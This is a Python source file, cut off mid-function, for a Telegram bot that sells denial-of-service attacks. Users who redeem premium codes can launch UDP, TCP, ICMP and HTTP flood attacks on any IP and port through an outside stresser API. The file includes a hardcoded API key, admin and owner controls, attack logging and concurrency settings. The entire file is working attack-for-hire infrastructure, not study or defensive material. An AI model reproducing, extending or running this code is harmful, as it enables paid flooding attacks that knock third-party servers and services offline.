import os
import logging
import asyncio
import aiohttp
import time
import random
import string
import json
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
from pymongo import MongoClient
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
API_URL = os.getenv("API_URL", "https://mrstresser.com/api")
MONGO_URI = os.getenv("MONGO_URI")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))

# CONCURRENT SETTINGS - Default 2 (allows 4 simultaneous attacks with 8 total concurrent)
CONFIG = {
    "DEFAULT_CONCURRENT": int(os.getenv("DEFAULT_CONCURRENT", "2"))
}
MIN_CONCURRENT = 1
MAX_CONCURRENT = 8
MIN_DURATION = 30
MAX_DURATION = 300
TOTAL_CONCURRENT = 8  # Total API concurrent limit

# ATTACK METHODS
ATTACK_METHODS = [
    "UDP-FLOOD",  # DEFAULT
    "UDP-VSE", "UDP-DNS",
    "TCP-SYN", "TCP-ACK", "TCP-STOMP", "TCP-HANDSHAKE",
    "ICMP-FLOOD", "GRE-FLOOD",
    "TLSV2", "HTTPS-MIX", "HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER"
]

METHOD_MAP = {
    "UDP-FLOOD": "UDP-FLOOD",
    "UDP-VSE": "UDP-VSE", 
    "UDP-DNS": "UDP-DNS",
    "TCP-SYN": "TCP-SYN",
    "TCP-ACK": "TCP-ACK",
    "TCP-STOMP": "TCP-STOMP",
    "TCP-HANDSHAKE": "TCP-HANDSHAKE",
    "ICMP-FLOOD": "ICMP-FLOOD",
    "GRE-FLOOD": "GRE-FLOOD",
    "TLSV2": "TLSV2",
    "HTTPS-MIX": "HTTPS-MIX",
    "HTTP-KILLER": "HTTP-KILLER",
    "HTTP-DESTROYER": "HTTP-DESTROYER",
    "HTTP-BYPASSER": "HTTP-BYPASSER"
}

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

def get_concurrent():
    return CONFIG["DEFAULT_CONCURRENT"]

def set_concurrent(value):
    CONFIG["DEFAULT_CONCURRENT"] = value

# ===== DATABASE =====
class Database:
    def __init__(self, mongo_uri):
        self.memory_mode = True
        self.users = {}
        self.codes = {}
        self.logs = []
        self.admins = {}
        self.settings = {"pause_all": False}
        
        try:
            if mongo_uri:
                self.client = MongoClient(
                    mongo_uri,
                    serverSelectionTimeoutMS=5000,
                    connectTimeoutMS=5000,
                    socketTimeoutMS=5000
                )
                self.client.admin.command('ping')
                
                self.db = self.client["guru_bot"]
                self.users_col = self.db.users
                self.codes_col = self.db.redeem_codes
                self.logs_col = self.db.attack_logs
                self.admins_col = self.db.admins
                self.settings_col = self.db.settings
                
                self.users_col.create_index("user_id", unique=True)
                self.codes_col.create_index("code", unique=True)
                self.admins_col.create_index("user_id", unique=True)
                
                if not self.settings_col.find_one({"_id": "bot_settings"}):
                    self.settings_col.insert_one({
                        "_id": "bot_settings",
                        "pause_all": False,
                        "paused_by": None,
                        "paused_at": None,
                        "pause_reason": None
                    })
                
                self.memory_mode = False
                logger.info("✅ MongoDB connected successfully!")
            else:
                raise Exception("No MongoDB URI provided")
        except Exception as e:
            logger.error(f"❌ MongoDB connection failed: {e}")
            self.memory_mode = True
            logger.warning("⚠️ Using in-memory storage")
    
    def add_user(self, user_id, username=None, first_name=None):
        try:
            if self.memory_mode:
                if user_id not in self.users:
                    self.users[user_id] = {
                        "user_id": user_id,
                        "username": username or "N/A",
                        "first_name": first_name or "User",
                        "plan": "free",
                        "plan_expiry": None,
                        "has_used_code": False,
                        "is_banned": False,
                        "attack_count": 0,
                        "created_at": datetime.now()
                    }
                    return True
                return False
            else:
                result = self.users_col.update_one(
                    {"user_id": user_id},
                    {"$setOnInsert": {
                        "username": username or "N/A",
                        "first_name": first_name or "User",
                        "plan": "free",
                        "plan_expiry": None,
                        "has_used_code": False,
                        "is_banned": False,
                        "attack_count": 0,
                        "created_at": datetime.now()
                    }},
                    upsert=True
                )
                return True
        except Exception as e:
            logger.error(f"Error adding user: {e}")
            return False
    
    def get_user(self, user_id):
        try:
            if self.memory_mode:
                return self.users.get(user_id)
            else:
                return self.users_col.find_one({"user_id": user_id})
        except Exception as e:
            logger.error(f"Error getting user: {e}")
            return None
    
    def get_user_plan(self, user_id):
        try:
            user = self.get_user(user_id)
            if not user:
                return "free", None
            
            plan = user.get("plan", "free")
            expiry = user.get("plan_expiry")
            
            if plan == "free":
                return "free", None
            
            if plan == "premium":
                if expiry is None:
                    return "premium", None
                
                if isinstance(expiry, str):
                    try:
                        expiry = datetime.fromisoformat(expiry)
                    except:
                        return "premium", None
                
                if expiry and isinstance(expiry, datetime):
                    if expiry < datetime.now():
                        return "premium", expiry
                    else:
                        return "premium", expiry
                else:
                    return "premium", None
            
            return plan, expiry
        except Exception as e:
            logger.error(f"Error getting user plan: {e}")
            return "free", None
    
    def update_user_plan(self, user_id, plan, expiry):
        try:
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["plan"] = plan
                    self.users[user_id]["plan_expiry"] = expiry.isoformat() if expiry else None
                    return True
                return False
            else:
                expiry_str = expiry.isoformat() if expiry else None
                result = self.users_col.update_one(
                    {"user_id": user_id},
                    {"$set": {
                        "plan": plan,
                        "plan_expiry": expiry_str,
                        "has_used_code": True if plan == "premium" else False
                    }}
                )
                return result.modified_count > 0 or result.matched_count > 0
        except Exception as e:
            logger.error(f"Error updating user plan: {e}")
            return False
    
    def is_admin(self, user_id):
        try:
            if self.memory_mode:
                return user_id in self.admins
            else:
                return self.admins_col.find_one({"user_id": user_id}) is not None
        except:
            return False
    
    def get_admin_level(self, user_id):
        try:
            if self.memory_mode:
                return self.admins.get(user_id, {}).get("level")
            else:
                admin = self.admins_col.find_one({"user_id": user_id})
                return admin.get("level") if admin else None
        except:
            return None
    
    def is_owner_or_pseudo(self, user_id):
        level = self.get_admin_level(user_id)
        return level in ["owner", "pseudo_owner"]
    
    def add_admin(self, user_id, username, level, added_by):
        try:
            if self.is_admin(user_id):
                return False
            
            if self.memory_mode:
                self.admins[user_id] = {"user_id": user_id, "level": level}
                if user_id in self.users:
                    self.users[user_id]["plan"] = "premium"
                return True
            else:
                self.admins_col.insert_one({
                    "user_id": user_id,
                    "username": username,
                    "level": level,
                    "added_by": added_by,
                    "added_at": datetime.now()
                })
                self.update_user_plan(user_id, "premium", None)
                return True
        except Exception as e:
            logger.error(f"Error adding admin: {e}")
            return False
    
    def remove_admin(self, user_id):
        try:
            if self.memory_mode:
                if user_id in self.admins:
                    del self.admins[user_id]
                    return True
                return False
            else:
                result = self.admins_col.delete_one({"user_id": user_id})
                return result.deleted_count > 0
        except:
            return False
    
    def get_admins(self):
        try:
            if self.memory_mode:
                return [{"user_id": uid, "level": data.get("level", "admin")} for uid, data in self.admins.items()]
            else:
                return list(self.admins_col.find({}))
        except:
            return []
    
    def is_banned(self, user_id):
        try:
            user = self.get_user(user_id)
            return user.get("is_banned", False) if user else False
        except:
            return False
    
    def ban_user(self, user_id, reason=None, banned_by=None):
        try:
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["is_banned"] = True
                    self.users[user_id]["ban_reason"] = reason
                return True
            else:
                self.users_col.update_one(
                    {"user_id": user_id},
                    {"$set": {"is_banned": True, "ban_reason": reason, "banned_by": banned_by, "banned_at": datetime.now()}}
                )
                return True
        except:
            return False
    
    def unban_user(self, user_id):
        try:
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["is_banned"] = False
                    self.users[user_id]["ban_reason"] = None
                return True
            else:
                self.users_col.update_one(
                    {"user_id": user_id},
                    {"$set": {"is_banned": False, "ban_reason": None, "banned_by": None, "banned_at": None}}
                )
                return True
        except:
            return False
    
    def create_code(self, code, days, created_by):
        try:
            if self.memory_mode:
                if code in self.codes:
                    return False
                self.codes[code] = {
                    "code": code,
                    "access_days": days,
                    "created_by": created_by,
                    "created_at": datetime.now(),
                    "is_used": False
                }
                return True
            else:
                if self.codes_col.find_one({"code": code}):
                    return False
                self.codes_col.insert_one({
                    "code": code,
                    "access_days": days,
                    "created_by": created_by,
                    "created_at": datetime.now(),
                    "used_by": None,
                    "used_at": None,
                    "is_used": False
                })
                return True
        except Exception as e:
            logger.error(f"Error creating code: {e}")
            return False
    
    def use_code(self, code, user_id):
        try:
            if self.memory_mode:
                if code not in self.codes or self.codes[code].get("is_used"):
                    return None
                
                code_data = self.codes[code]
                code_data["is_used"] = True
                code_data["used_by"] = user_id
                code_data["used_at"] = datetime.now()
                
                days = code_data["access_days"]
                expiry = None if days >= 3650 else datetime.now() + timedelta(days=days)
                
                if user_id not in self.users:
                    self.add_user(user_id)
                self.users[user_id]["plan"] = "premium"
                self.users[user_id]["plan_expiry"] = expiry
                self.users[user_id]["has_used_code"] = True
                return code_data
            else:
                code_data = self.codes_col.find_one({"code": code, "is_used": False})
                if not code_data:
                    return None
                
                self.codes_col.update_one(
                    {"code": code},
                    {"$set": {"is_used": True, "used_by": user_id, "used_at": datetime.now()}}
                )
                
                days = code_data["access_days"]
                expiry = None if days >= 3650 else datetime.now() + timedelta(days=days)
                
                if not self.get_user(user_id):
                    self.add_user(user_id)
                
                expiry_str = expiry.isoformat() if expiry else None
                
                self.users_col.update_one(
                    {"user_id": user_id},
                    {"$set": {
                        "plan": "premium",
                        "plan_expiry": expiry_str,
                        "has_used_code": True,
                        "code_used": code,
                        "redeem_date": datetime.now().isoformat()
                    }}
                )
                
                return code_data
        except Exception as e:
            logger.error(f"Error using code: {e}")
            return None
    
    def get_codes(self, only_unused=False):
        try:
            if self.memory_mode:
                codes = list(self.codes.values())
                if only_unused:
                    codes = [c for c in codes if not c.get("is_used")]
                return codes
            else:
                query = {"is_used": False} if only_unused else {}
                return list(self.codes_col.find(query).sort("created_at", -1))
        except:
            return []
    
    def delete_code(self, code):
        try:
            if self.memory_mode:
                if code in self.codes:
                    del self.codes[code]
                    return True
                return False
            else:
                result = self.codes_col.delete_one({"code": code})
                return result.deleted_count > 0
        except:
            return False
    
    def log_attack(self, user_id, target, port, duration, method, status, response, concurrent_count=1):
        try:
            log = {
                "user_id": user_id,
                "target": target,
                "port": port,
                "duration": duration,
                "method": method,
                "status": status,
                "concurrent": concurrent_count,
                "response": response[:500] if response else None,
                "timestamp": datetime.now()
            }
            
            if self.memory_mode:
                self.logs.append(log)
            else:
                self.logs_col.insert_one(log)
            
            # Update user attack count
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["attack_count"] = self.users[user_id].get("attack_count", 0) + 1
            else:
                self.users_col.update_one(
                    {"user_id": user_id},
                    {"$inc": {"attack_count": 1},
                     "$set": {"last_attack_time": datetime.now().isoformat(),
                              "last_attack_duration": duration}}
                )
            return True
        except:
            return False
    
    def get_total_attacks(self):
        try:
            if self.memory_mode:
                return len(self.logs)
            else:
                return self.logs_col.count_documents({})
        except:
            return 0
    
    def get_user_stats(self, user_id):
        try:
            if self.memory_mode:
                return len([l for l in self.logs if l.get("user_id") == user_id])
            else:
                return self.logs_col.count_documents({"user_id": user_id})
        except:
            return 0
    
    def get_all_users(self):
        try:
            if self.memory_mode:
                return list(self.users.values())
            else:
                return list(self.users_col.find({}))
        except:
            return []
    
    def get_pause_info(self):
        try:
            if self.memory_mode:
                return {"paused": self.settings.get("pause_all", False)}
            else:
                settings = self.settings_col.find_one({"_id": "bot_settings"})
                if settings:
                    return {
                        "paused": settings.get("pause_all", False),
                        "paused_by": settings.get("paused_by"),
                        "paused_at": settings.get("paused_at"),
                        "pause_reason": settings.get("pause_reason")
                    }
                return {"paused": False}
        except:
            return {"paused": False}
    
    def set_pause(self, paused, paused_by=None, reason=None):
        try:
            if self.memory_mode:
                self.settings["pause_all"] = paused
            else:
                self.settings_col.update_one(
                    {"_id": "bot_settings"},
                    {"$set": {
                        "pause_all": paused,
                        "paused_by": paused_by,
                        "paused_at": datetime.now() if paused else None,
                        "pause_reason": reason
                    }},
                    upsert=True
                )
            return True
        except:
            return False

db = Database(MONGO_URI)

# ===== INITIALIZE OWNERS =====
def init_owners():
    try:
        owner = db.get_user(OWNER_ID)
        if not owner:
            db.add_user(OWNER_ID, "owner", "Owner")
        
        if not db.is_admin(OWNER_ID):
            db.add_admin(OWNER_ID, "owner", "owner", OWNER_ID)
        
        plan, expiry = db.get_user_plan(OWNER_ID)
        if plan != "premium":
            db.update_user_plan(OWNER_ID, "premium", None)
        logger.info(f"✅ Owner {OWNER_ID} initialized")
    except Exception as e:
        logger.error(f"Error initializing owner: {e}")

def init_pseudo_owner():
    try:
        if PSEUDO_OWNER_ID and PSEUDO_OWNER_ID != 0 and PSEUDO_OWNER_ID != OWNER_ID:
            pseudo_owner = db.get_user(PSEUDO_OWNER_ID)
            if not pseudo_owner:
                db.add_user(PSEUDO_OWNER_ID, "pseudo_owner", "Pseudo Owner")
            
            if not db.is_admin(PSEUDO_OWNER_ID):
                db.add_admin(PSEUDO_OWNER_ID, "pseudo_owner", "pseudo_owner", OWNER_ID)
            
            plan, expiry = db.get_user_plan(PSEUDO_OWNER_ID)
            if plan != "premium":
                db.update_user_plan(PSEUDO_OWNER_ID, "premium", None)
            logger.info(f"✅ Pseudo Owner {PSEUDO_OWNER_ID} initialized")
    except Exception as e:
        logger.error(f"Error initializing pseudo owner: {e}")

init_owners()
init_pseudo_owner()

# ===== API FUNCTIONS =====
async def send_api_attack(target, port, duration, method, concurrent):
    """Send attack to API with proper concurrent parameter"""
    api_key = API_KEY
    api_url = API_URL
    
    if not api_key:
        return {"success": False, "error": "API Key missing"}
    
    api_method = METHOD_MAP.get(method.upper(), "UDP-FLOOD")
    
    params = {
        "key": api_key,
        "host": target,
        "port": str(port),
        "time": str(duration),
        "method": api_method,
        "concs": str(concurrent)
    }
    
    if method.upper() in ["HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER", "HTTPS-MIX", "TLSV2"]:
        params["req_method"] = "GET"
        params["geoloc"] = "MIX"
        params["version"] = "1"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
    }
    
    timeout = aiohttp.ClientTimeout(total=35, connect=15)
    
    logger.info(f"🚀 Sending attack with {concurrent} concurrent to {target}:{port}")
    logger.info(f"📡 Method: {api_method}")
    
    try:
        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
            start_time = time.time()
            
            async with session.get(api_url, params=params) as response:
                elapsed = time.time() - start_time
                response_text = await response.text(encoding='utf-8', errors='ignore')
                
                try:
                    response_data = json.loads(response_text)
                except:
                    response_data = {"raw": response_text[:200]}
                
                logger.info(f"📊 API Response: {response.status} in {elapsed:.2f}s")
                
                if response.status == 200 and response_data.get('status') == 'success':
                    return {
                        "success": True,
                        "elapsed": elapsed,
                        "status": response.status,
                        "concurrent": concurrent,
                        "response": response_data,
                        "attack_id": response_data.get('attack_id', 'N/A')
                    }
                else:
                    error_msg = response_data.get('message', f'HTTP {response.status}')
                    return {
                        "success": False,
                        "error": error_msg,
                        "status": response.status,
                        "concurrent": concurrent,
                        "response": response_data
                    }
    except asyncio.TimeoutError:
        return {"success": False, "error": "Request timeout", "concurrent": concurrent}
    except Exception as e:
        logger.error(f"API attack failed: {e}")
        return {"success": False, "error": str(e)[:50], "concurrent": concurrent}

# ===== ATTACK MANAGER =====
class AttackManager:
    def __init__(self):
        self.active_attacks = []
        self.total_attacks = 0
        self.lock = asyncio.Lock()
        logger.info(f"🔥 Attack Manager initialized with concurrent: {get_concurrent()}")
    
    async def can_start_attack(self, user_id):
        if db.is_banned(user_id):
            return False, "❌ You are banned!"
        
        plan, expiry = db.get_user_plan(user_id)
        is_owner = db.is_owner_or_pseudo(user_id)
        is_admin = db.is_admin(user_id)
        
        if not is_owner and not is_admin and plan != "premium":
            return False, "❌ PREMIUM REQUIRED\n\nUse `/redeem CODE` to activate."
        
        if plan == "premium" and expiry and expiry < datetime.now() and not is_owner:
            return False, "❌ PLAN EXPIRED"
        
        return True, "OK"
    
    async def start_attack(self, user_id, target, port, duration, method, context, concurrent):
        async with self.lock:
            attack_id = self.total_attacks + 1
            self.total_attacks += 1
            
            attack_info = {
                'id': attack_id,
                'user_id': user_id,
                'target': f"{target}:{port}",
                'start_time': datetime.now(),
                'duration': duration,
                'concurrent': concurrent,
                'method': method
            }
            
            self.active_attacks.append(attack_info)
            
            logger.info(f"🔥 Attack {attack_id} starting - User: {user_id} - Target: {target}:{port} - Concurrent: {concurrent}")
            logger.info(f"📊 Active attacks: {len(self.active_attacks)}")
            
            asyncio.create_task(
                self.execute_attack(attack_id, target, port, duration, user_id, context, method, concurrent)
            )
            
            return True, f"Attack started with {concurrent} concurrent connections"
    
    async def execute_attack(self, attack_id, target, port, duration, user_id, context, method, concurrent):
        try:
            result = await send_api_attack(target, port, duration, method, concurrent)
            
            # Get user info for display
            user = db.get_user(user_id)
            first_name = user.get('first_name', 'User') if user else 'User'
            username = user.get('username', '') if user else ''
            
            # Create display name: use first_name if available, otherwise username, fallback to ID
            if first_name and first_name != 'User' and first_name != 'N/A':
                display_name = first_name
            elif username and username != 'N/A':
                display_name = f"@{username}"
            else:
                display_name = f"User {user_id}"
            
            plan = user.get('plan', 'free').upper() if user else 'FREE'
            
            db.log_attack(
                user_id, target, port, duration, method,
                "success" if result.get('success') else "failed",
                str(result.get('response', {}))[:200],
                concurrent
            )
            
            # Get active attacks count for concurrent display
            active_count = len(self.active_attacks)
            used_concurrent = active_count * get_concurrent()
            concurrent_display = f"{used_concurrent}/{TOTAL_CONCURRENT}"
            
            # Send result to user
            if result.get('success'):
                attack_id_resp = result.get('attack_id', 'N/A')
                await context.bot.send_message(
                    user_id,
                    f"✅ *Attack Completed!*\n\n"
                    f"🎯 Target: `{target}:{port}`\n"
                    f"⏱️ Duration: `{duration}s`\n"
                    f"🔄 Concurrent: **{concurrent}**\n"
                    f"📡 Method: `{method}`\n"
                    f"🆔 Attack ID: `{attack_id_resp}`\n"
                    f"⚡ Status: SUCCESS",
                    parse_mode='Markdown'
                )
            else:
                error = result.get('error', 'Unknown error')
                await context.bot.send_message(
                    user_id,
                    f"❌ *Attack Failed!*\n\n"
                    f"🎯 Target: `{target}:{port}`\n"
                    f"🔄 Concurrent: **{concurrent}**\n"
                    f"📡 Method: `{method}`\n"
                    f"❌ Error: `{error}`",
                    parse_mode='Markdown'
                )
                
            # Send alert to admins with user name (like old format)
            admins = db.get_admins()
            plan_display = "PREMIUM" if plan == "PREMIUM" else "FREE"
            
            for admin in admins:
                try:
                    status_emoji = "✅" if result.get('success') else "❌"
                    status_text = "SUCCESS" if result.get('success') else "FAILED"
                    
                    await context.bot.send_message(
                        admin['user_id'],
                        f"⚡ *ATTACK ALERT*\n\n"
                        f"{status_emoji} Status: {status_text}\n"
                        f"🆔 Attack #: {attack_id}\n"
                        f"👤 User: {display_name}\n"
                        f"🆔 ID: `{user_id}`\n"
                        f"📊 Plan: {plan_display}\n"
                        f"🎯 Target: `{target}:{port}`\n"
                        f"⏱️ Duration: {duration}s\n"
                        f"📡 Method: {method}\n"
                        f"🔄 Concurrent: {concurrent_display}\n"
                        f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    logger.error(f"Failed to send alert to admin: {e}")
                    
        except Exception as e:
            logger.error(f"❌ Attack {attack_id} error: {e}")
        finally:
            await self.cleanup_attack(attack_id)
    
    async def cleanup_attack(self, attack_id):
        async with self.lock:
            self.active_attacks = [a for a in self.active_attacks if a['id'] != attack_id]
            logger.info(f"✅ Attack {attack_id} cleaned up. Active attacks: {len(self.active_attacks)}")
    
    async def stop_attack(self, user_id, attack_id=None):
        async with self.lock:
            if not self.active_attacks:
                return False, "No active attacks!"
            
            if attack_id:
                attack = next((a for a in self.active_attacks if a['id'] == attack_id), None)
                if attack:
                    self.active_attacks = [a for a in self.active_attacks if a['id'] != attack_id]
                    return True, f"Attack #{attack_id} stopped!"
                return False, f"Attack #{attack_id} not found!"
            else:
                count = len(self.active_attacks)
                self.active_attacks = []
                return True, f"Stopped {count} active attacks!"
    
    def get_stats(self):
        active_count = len(self.active_attacks)
        used_concurrent = active_count * get_concurrent()
        
        return {
            'active_attacks': active_count,
            'total_attacks': self.total_attacks,
            'concurrent_value': get_concurrent(),
            'used_concurrent': used_concurrent,
            'remaining_concurrent': TOTAL_CONCURRENT - used_concurrent,
            'active_targets': [a['target'] for a in self.active_attacks]
        }

attack_manager = AttackManager()

# ===== TELEGRAM HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    # Get user info from Telegram
    first_name = user.first_name or "User"
    username = user.username
    
    db.add_user(user_id, username, first_name)
    
    plan, expiry = db.get_user_plan(user_id)
    is_admin = db.is_admin(user_id)
    is_owner = db.is_owner_or_pseudo(user_id)
    
    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await update.message.reply_text("⏸️ *Bot is Paused*", parse_mode='Markdown')
        return
    
    stats = attack_manager.get_stats()
    total_attacks = db.get_user_stats(user_id)
    
    plan_display = "💎 PREMIUM" if plan == "premium" else "🆓 FREE"
    if plan == "premium" and expiry:
        days_left = max(0, (expiry - datetime.now()).days)
        plan_display = f"💎 PREMIUM ({days_left}d left)"
    
    active_attacks = stats['active_attacks']
    used_concurrent = stats['used_concurrent']
    remaining_concurrent = stats['remaining_concurrent']
    max_attacks = TOTAL_CONCURRENT // get_concurrent()
    
    active_text = f"🟢 Active Attacks: {active_attacks}" if active_attacks > 0 else "🔴 No Active Attacks"
    
    keyboard = []
    if not db.is_banned(user_id):
        keyboard.append([InlineKeyboardButton("💥 ATTACK", callback_data="attack")])
        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
    
    if is_admin:
        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    if is_owner:
        keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
    
    welcome_msg = (
        f"👋 *WELCOME TO GURU*\n\n"
        f"Hello {first_name}! 👋\n"
        f"📊 Total Attacks: {total_attacks}\n"
        f"📊 Plan: {plan_display}\n"
        f"⚡ Status: {active_text}\n"
        f"🔄 Concurrent per Attack: **{get_concurrent()}**\n"
        f"📡 Used/Total Concurrent: **{used_concurrent}/{TOTAL_CONCURRENT}**\n"
        f"📡 Max Simultaneous Attacks: **{max_attacks}**\n\n"
        f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack IP PORT TIME'}\n"
        f"📡 Default method: UDP-FLOOD\n"
        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION} seconds\n\n"
        f"⚡ *ATTACK FEATURES*\n"
        f"• {get_concurrent()}x concurrent per attack\n"
        f"• Multiple attacks allowed (up to {max_attacks} simultaneous)\n"
        f"📡 *Methods:* " + ", ".join(ATTACK_METHODS[:5]) + f"... (+{len(ATTACK_METHODS)-5} more)"
    )
    
    await update.message.reply_text(
        welcome_msg,
        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await update.message.reply_text("⏸️ *Bot is Paused*", parse_mode='Markdown')
        return
    
    can_start, msg = await attack_manager.can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(msg, parse_mode='Markdown')
        return
    
    args = context.args
    if args is None or len(args) < 3:
        await update.message.reply_text(
            f"❌ *Usage:* `/attack IP PORT TIME [METHOD]`\n\n"
            f"Example: `/attack 8.8.8.8 43 30`\n"
            f"With method: `/attack 8.8.8.8 43 30 TCP-SYN`\n\n"
            f"⚡ Concurrent per attack: **{get_concurrent()}**\n"
            f"📡 Total API Concurrent: **{TOTAL_CONCURRENT}**\n"
            f"📡 Max simultaneous: **{TOTAL_CONCURRENT // get_concurrent()}** attacks\n"
            f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n"
            f"📡 Default Method: UDP-FLOOD",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        method = "UDP-FLOOD"
        if len(args) > 3:
            method = args[3].upper()
            if method not in ATTACK_METHODS:
                method = "UDP-FLOOD"
        
        if duration < MIN_DURATION or duration > MAX_DURATION:
            await update.message.reply_text(f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION} seconds!")
            return
        
        success, msg = await attack_manager.start_attack(
            user_id, target, port, duration, method, context, get_concurrent()
        )
        
        if not success:
            await update.message.reply_text(f"❌ {msg}", parse_mode='Markdown')
            return
        
        stats = attack_manager.get_stats()
        
        await update.message.reply_text(
            f"✅ *ATTACK STARTED!*\n\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Duration: `{duration}s`\n"
            f"📡 Method: `{method}`\n"
            f"🔄 Concurrent: **{get_concurrent()}**\n"
            f"⚡ Active Attacks: **{stats['active_attacks']}**\n"
            f"📡 Used/Total Concurrent: **{stats['used_concurrent']}/{TOTAL_CONCURRENT}**\n"
            f"📡 Remaining Concurrent: **{stats['remaining_concurrent']}**\n"
            f"⚡ Status: **RUNNING**",
            parse_mode='Markdown'
        )
        
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid port or time!\nError: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not db.is_owner_or_pseudo(user_id):
        await update.message.reply_text("❌ Only owners can stop attacks!")
        return
    
    args = context.args
    attack_id = int(args[0]) if args and args[0].isdigit() else None
    
    success, msg = await attack_manager.stop_attack(user_id, attack_id)
    
    if success:
        await update.message.reply_text(
            f"🛑 *Attack Stopped!*\n\n{msg}",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(f"❌ {msg}")

async def set_concurrent_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not db.is_owner_or_pseudo(user_id):
        await update.message.reply_text("❌ Only owners can change concurrent settings!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text(
            f"⚡ *CONCURRENT SETTINGS*\n\n"
            f"Current concurrent per attack: **{get_concurrent()}**\n"
            f"Total API Concurrent: **{TOTAL_CONCURRENT}**\n"
            f"Max simultaneous attacks: **{TOTAL_CONCURRENT // get_concurrent()}**\n"
            f"Min: {MIN_CONCURRENT}\n"
            f"Max: {MAX_CONCURRENT}\n\n"
            f"Usage: `/setconcurrent 2`",
            parse_mode='Markdown'
        )
        return
    
    try:
        new_concurrent = int(args[0])
        if new_concurrent < MIN_CONCURRENT or new_concurrent > MAX_CONCURRENT:
            await update.message.reply_text(f"❌ Concurrent must be between {MIN_CONCURRENT} and {MAX_CONCURRENT}!")
            return
        
        set_concurrent(new_concurrent)
        
        max_attacks = TOTAL_CONCURRENT // new_concurrent
        await update.message.reply_text(
            f"✅ *Concurrent updated!*\n\n"
            f"New concurrent per attack: **{get_concurrent()}**\n"
            f"Total API Concurrent: **{TOTAL_CONCURRENT}**\n"
            f"Max simultaneous attacks: **{max_attacks}**\n\n"
            f"All future attacks will use {get_concurrent()} concurrent connections.",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid number!")

async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not db.is_owner_or_pseudo(user_id):
        await update.message.reply_text("❌ Only owners can test API parameters!")
        return
    
    args = context.args
    if args is None or len(args) < 3:
        await update.message.reply_text(
            f"🔬 *API TEST COMMAND*\n\n"
            f"Usage: `/testapi HOST PORT TIME [METHOD]`\n\n"
            f"Example: `/testapi 8.8.8.8 43 30`",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        method = args[3].upper() if len(args) > 3 else "UDP-FLOOD"
        
        if method not in ATTACK_METHODS:
            method = "UDP-FLOOD"
        
        status_msg = await update.message.reply_text(
            f"🔬 *Testing API...*\n\n"
            f"Target: `{target}:{port}`\n"
            f"Concurrent: `{get_concurrent()}`\n"
            f"Method: `{method}`",
            parse_mode='Markdown'
        )
        
        result = await send_api_attack(target, port, duration, method, get_concurrent())
        
        if result.get('success'):
            await status_msg.edit_text(
                f"✅ *API TEST SUCCESSFUL*\n\n"
                f"📡 Target: `{target}:{port}`\n"
                f"🔄 Concurrent: `{get_concurrent()}`\n"
                f"📡 Method: `{method}`\n"
                f"🆔 Attack ID: `{result.get('attack_id', 'N/A')}`\n"
                f"⏱️ Response Time: `{result.get('elapsed', 0):.2f}s`",
                parse_mode='Markdown'
            )
        else:
            await status_msg.edit_text(
                f"❌ *API TEST FAILED*\n\n"
                f"📡 Target: `{target}:{port}`\n"
                f"❌ Error: `{result.get('error', 'Unknown error')}`",
                parse_mode='Markdown'
            )
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = attack_manager.get_stats()
    users = db.get_all_users()
    
